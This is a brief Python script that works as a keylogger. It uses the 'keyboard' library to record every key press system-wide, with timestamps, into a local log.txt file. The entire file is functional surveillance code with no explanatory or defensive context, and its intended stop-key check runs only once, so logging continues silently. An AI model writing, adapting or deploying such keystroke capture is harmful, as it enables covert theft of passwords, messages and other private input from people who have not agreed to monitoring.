import keyboard as kb
import time


def keylog():
   with open('log.txt','a') as log_f: 
      log_f.write('\n--------------------------------logfile------------------------------------\n')
      def on_press(key):
          currret_t=time.time()
          cur_time=time.ctime(currret_t)
         
          log_f.write(str(cur_time)+" keypressed :"+str(key.name)+"\n")
          log_f.flush()
          
        
      kb.on_press(on_press)
      stopkey="ctrl+c"
     
      if kb.is_pressed(stopkey) :
          kb.unhook_all()
      kb.wait()
keylog()   
